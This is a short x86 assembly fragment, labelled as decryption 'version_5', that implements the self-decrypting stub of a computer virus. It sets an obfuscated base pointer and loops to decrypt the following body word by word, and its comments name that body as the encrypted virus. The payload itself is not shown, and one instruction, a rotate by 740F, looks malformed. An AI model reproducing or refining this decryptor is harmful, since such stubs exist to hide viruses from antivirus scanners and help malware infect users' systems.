;decrpytion version_5

mov bp,A16C
mov cl,03
ror bp,cl
mov cx,bp
mov bp,856E
ror bp,740F
mov si,bp
mov bp,3B92
add bp,si
xor bp,cx
sub bp,B10C  ;BP is set now but  it's still obscurated by encrypted body indicator


Decrypt:
mov bx,[bp+0D2B] ;take next word
add bx,9D64  ;decrypt
xchg [bp+0D2B],bx
mov bx,8F31 ;this is inceremneting BP by 2
sub bx,bp
mov bp,8F33
sub bp,bx ;and take over decryption length
jnz Decrypt

Start:
 ;body of encrypted/decrypted virus

